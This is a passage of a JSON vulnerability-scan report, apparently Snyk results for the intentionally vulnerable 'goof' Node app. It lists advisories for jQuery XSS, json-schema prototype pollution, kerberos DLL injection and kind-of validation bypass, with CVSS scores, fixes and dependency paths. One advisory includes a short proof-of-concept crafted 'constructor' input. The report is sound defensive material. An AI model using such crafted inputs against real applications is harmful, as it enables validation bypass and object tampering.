malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n\n## Remediation\n\nUpgrade `jquery` to version 1.12.2, 2.2.0, 3.0.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/f60729f3903d17917dc351f3ac87794de379b0cc)\n\n- [GitHub Commit](https://github.com/jquery/jquery/pull/2588/commits/c254d308a7d3f1eac4d0b42837804cfffcba4bb2)\n\n- [GitHub Issue](https://github.com/jquery/jquery/issues/2432)\n\n- [GitHub PR](https://github.com/jquery/jquery/pull/2588)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N\",\n  \"alternativeIds\": [\n    \"SNYK-JS-JQUERY-10186\"\n  ],\n  \"creationTime\": \"2016-11-06T15:12:44.538000Z\",\n  \"credit\": [\n    \"Egor Homakov\"\n  ],\n  \"cvssScore\": 5.4,\n  \"description\": \"## Overview\\n\\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\\n\\n\\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\\nattacks when a cross-domain ajax request is performed without the `dataType` option causing `text/javascript` responses to be executed.\\n\\n## Details\\n A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\\r\\n\\r\\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\\r\\n\\r\\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\\r\\n\\r\\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\\r\\n \\r\\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \\r\\n\\r\\n### Types of attacks\\r\\nThere are a few methods by which XSS can be manipulated:\\r\\n\\r\\n|Type|Origin|Description|\\r\\n|--|--|--|\\r\\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\\r\\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \\r\\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\\r\\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\\r\\n\\r\\n### Affected environments\\r\\nThe following environments are susceptible to an XSS attack:\\r\\n\\r\\n* Web servers\\r\\n* Application servers\\r\\n* Web application environments\\r\\n\\r\\n### How to prevent\\r\\nThis section describes the top best practices designed to specifically protect your code: \\r\\n\\r\\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \\r\\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \\r\\n* Give users the option to disable client-side scripts.\\r\\n* Redirect invalid requests.\\r\\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\\r\\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\\r\\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\\n\\n\\n## Remediation\\n\\nUpgrade `jquery` to version 1.12.2, 2.2.0, 3.0.0 or higher.\\n\\n\\n## References\\n\\n- [GitHub Commit](https://github.com/jquery/jquery/commit/f60729f3903d17917dc351f3ac87794de379b0cc)\\n\\n- [GitHub Commit](https://github.com/jquery/jquery/pull/2588/commits/c254d308a7d3f1eac4d0b42837804cfffcba4bb2)\\n\\n- [GitHub Issue](https://github.com/jquery/jquery/issues/2432)\\n\\n- [GitHub PR](https://github.com/jquery/jquery/pull/2588)\\n\",\n  \"disclosureTime\": \"2015-06-26T21:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"1.12.2\",\n    \"2.2.0\",\n    \"3.0.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:jquery:20150627\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-JQUERY-10186\"\n    ],\n    \"CVE\": [\n      \"CVE-2015-9251\",\n      \"CVE-2017-16012\"\n    ],\n    \"CWE\": [\n      \"CWE-79\"\n    ],\n    \"GHSA\": [\n      \"GHSA-rmxg-73gg-4p98\"\n    ],\n    \"NSP\": [\n      \"328\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-12-09T15:54:52.488054Z\",\n  \"moduleName\": \"jquery\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"jquery\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2016-11-27T00:00:00Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jquery/jquery/commit/f60729f3903d17917dc351f3ac87794de379b0cc\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jquery/jquery/pull/2588/commits/c254d308a7d3f1eac4d0b42837804cfffcba4bb2\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/jquery/jquery/issues/2432\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/jquery/jquery/pull/2588\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.12.2\",\n      \">=1.12.3 <2.2.0\",\n      \">=2.2.3 <3.0.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Cross-site Scripting (XSS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"jquery@2.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"jquery@3.0.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"jquery\",\n  \"version\": \"2.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , jquery@2.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [
              "2021-3918"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-JSONSCHEMA-1920922",
          "desc": "## Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `validate` function, which when given a special payload will pollute `Object` with undesired attributes.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `json-schema` to version 0.4.0 or higher.\n## References\n- [GitHub Commit](https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-11-14T15:11:37.579980Z\",\n  \"credit\": [\n    \"Yoshino-s\"\n  ],\n  \"cvssScore\": 8.6,\n  \"description\": \"## Overview\\n\\nAffected versions of this package are vulnerable to Prototype Pollution via the `validate` function, which when given a special payload will pollute `Object` with undesired attributes.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `json-schema` to version 0.4.0 or higher.\\n## References\\n- [GitHub Commit](https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741)\\n\",\n  \"disclosureTime\": \"2021-11-14T15:05:57Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.4.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-JSONSCHEMA-1920922\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-3918\"\n    ],\n    \"CWE\": [\n      \"CWE-1321\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-12-17T15:25:44.736835Z\",\n  \"moduleName\": \"json-schema\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"json-schema\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2021-11-14T16:49:43.070251Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.4.0\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"coveralls@3.0.9\",\n    \"request@2.88.0\",\n    \"http-signature@1.2.0\",\n    \"jsprim@1.4.1\",\n    \"json-schema@0.2.3\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@11.1.5\",\n    \"coveralls@3.0.9\",\n    \"request@2.88.0\",\n    \"http-signature@1.2.0\",\n    \"jsprim@1.4.2\",\n    \"json-schema@0.4.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"json-schema\",\n  \"version\": \"0.2.3\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , coveralls@3.0.9 , request@2.88.0 , http-signature@1.2.0 , jsprim@1.4.1 , json-schema@0.2.3 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "114"
            ],
            "cveid": [
              "2020-13110"
            ],
            "ghsaid": [
              "m2mx-rfpw-jghv"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "DLL Injection",
          "id": "SNYK-JS-KERBEROS-568900",
          "desc": "## Overview\n\nAffected versions of this package are vulnerable to DLL Injection. An attacker can execute arbitrary code by creating a file with the same name in a folder that precedes the intended file in the DLL path search.\n## Remediation\nUpgrade `kerberos` to version 1.0.0 or higher.\n## References\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1514)\n- [PoC](https://medium.com/@kiddo_Ha3ker/dll-injection-attack-in-kerberos-npm-package-cb4b32031cd)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-05-12T07:43:39.631967Z\",\n  \"credit\": [\n    \"Dan Shallom\",\n    \"OP Innovate Ltd\"\n  ],\n  \"cvssScore\": 8.4,\n  \"description\": \"## Overview\\n\\nAffected versions of this package are vulnerable to DLL Injection. An attacker can execute arbitrary code by creating a file with the same name in a folder that precedes the intended file in the DLL path search.\\n## Remediation\\nUpgrade `kerberos` to version 1.0.0 or higher.\\n## References\\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1514)\\n- [PoC](https://medium.com/@kiddo_Ha3ker/dll-injection-attack-in-kerberos-npm-package-cb4b32031cd)\\n\",\n  \"disclosureTime\": \"2020-05-11T21:44:49Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"1.0.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-KERBEROS-568900\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-13110\"\n    ],\n    \"CWE\": [\n      \"CWE-114\"\n    ],\n    \"GHSA\": [\n      \"GHSA-m2mx-rfpw-jghv\"\n    ],\n    \"NSP\": [\n      \"1514\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-01-06T14:29:42.090688Z\",\n  \"moduleName\": \"kerberos\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"kerberos\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-05-12T21:52:20Z\",\n  \"references\": [\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://www.npmjs.com/advisories/1514\"\n    },\n    {\n      \"title\": \"PoC\",\n      \"url\": \"https://medium.com/@kiddo_Ha3ker/dll-injection-attack-in-kerberos-npm-package-cb4b32031cd\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.0.0\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"DLL Injection\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongoose@4.2.4\",\n    \"mongodb@2.0.46\",\n    \"mongodb-core@1.2.19\",\n    \"kerberos@0.0.24\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongoose@4.2.5\",\n    \"mongodb@2.0.48\",\n    \"mongodb-core@1.2.21\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"kerberos\",\n  \"version\": \"0.0.24\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 , mongodb@2.0.46 , mongodb-core@1.2.19 , kerberos@0.0.24 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "20"
            ],
            "cveid": [
              "2019-20149"
            ],
            "ghsaid": [
              "6c8f-qphg-qjgp"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Validation Bypass",
          "id": "SNYK-JS-KINDOF-537849",
          "desc": "## Overview\n[kind-of](https://github.com/jonschlinkert/kind-of) is a package that gets the native type of a value.\n\nAffected versions of this package are vulnerable to Validation Bypass. It leverages the built-in constructor of unsafe user-input to detect type information. However, a crafted payload can overwrite this built in attribute to manipulate the type detection result.\r\n\r\n## PoC by Feng Xiao\r\n```\r\nvar kindOf = require('kind-of');\r\n\r\n\r\nvar user_input = {\r\n  user: 'barney',\r\n  age: 36,\r\n  active: true,\r\n  \"constructor\":{\"name\":\"Symbol\"}\r\n};\r\nconsole.log(kindOf(user_input));\r\n```\n## Remediation\nUpgrade `kind-of` to version 6.0.3 or higher.\n## References\n- [GitHub Issue](https://github.com/jonschlinkert/kind-of/issues/30)\n- [GitHub PR](https://github.com/jonschlinkert/kind-of/pull/31)\n",
          "impact": 0.3,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-12-16T14:21:14.675101Z\",\n  \"credit\": [\n    \"Feng Xiao\"\n  ],\n  \"cvssScore\": 3.7,\n  \"description\": \"## Overview\\n[kind-of](https://github.com/jonschlinkert/kind-of) is a package that gets the native type of a value.\\n\\nAffected versions of this package are vulnerable to Validation Bypass. It leverages the built-in constructor of unsafe user-input to detect type information. However, a crafted payload can overwrite this built in attribute to manipulate the type detection result.\\r\\n\\r\\n## PoC by Feng Xiao\\r\\n```\\r\\nvar kindOf = require('kind-of');\\r\\n\\r\\n\\r\\nvar user_input = {\\r\\n  user: 'barney',\\r\\n  age: 36,\\r\\n  active: true,\\r\\n  \\\"constructor\\\":{\\\"name\\\":\\\"Symbol\\\"}\\r\\n};\\r\\nconsole.log(kindOf(user_input));\\r\\n```\\n## Remediation\\nUpgrade `kind-of` to version 6.0.3 or higher.\\n## References\\n- [GitHub Issue](https://github.com/jonschlinkert/kind-of/issues/30)\\n- [GitHub PR](https://github.com/jonschlinkert/kind-of/pull/31)\\n\",\n  \"disclosureTime\": \"2019-12-16T14:31:14Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"6.0.3\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"ctorName\"\n      },\n      \"version\": [\n        \">=6.0.0 <6.0.3\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"ctorName\"\n      },\n      \"version\": [\n        \">=6.0.0 <6.0.3\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-KINDOF-537849\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-20149\"\n    ],\n    \"CWE\": [\n      \"CWE-20\"\n    ],\n    \"GHSA\": [\n      \"GHSA-6c8f-qphg-qjgp\"\n    ],\n    \"NSP\": [\n      \"1490\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-17T13:54:54.804808Z\",\n  \"moduleName\": \"kind-of\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"kind-of\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-01-19T14:31:13Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/jonschlinkert/kind-of/issues/30\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/jonschlinkert/kind-of/pull/31\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=6.0.0 <6.0.3\"\n    ]\n  },\n  \"severity\": \"low\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Validation Bypass\",\n  \"severityWithCritical\": \"low\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"micromatch@3.1.10\",\n    \"kind-of@6.0.2\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"micromatch@3.1.10\",\n    \"kind-of@6.0.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"kind-of\",\n  \"version\": \"6.0.2\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , nanomatch@1.2.9 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , define-property@2.0.2 , is-descriptor@1.0.2 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , snapdragon@0.8.2 , use@3.1.0 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , nanomatch@1.2.9 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , define-property@2.0.2 , is-descriptor@1.0.2 , is-accessor-descriptor@1.0.0 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , define-property@2.0.2 , is-descriptor@1.0.2 , is-data-descriptor@1.0.0 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , define-property@1.0.0 , is-descriptor@1.0.2 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , to-regex@3.0.2 , define-property@2.0.2 , is-descriptor@1.0.2 , kind-of@6.0.2 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
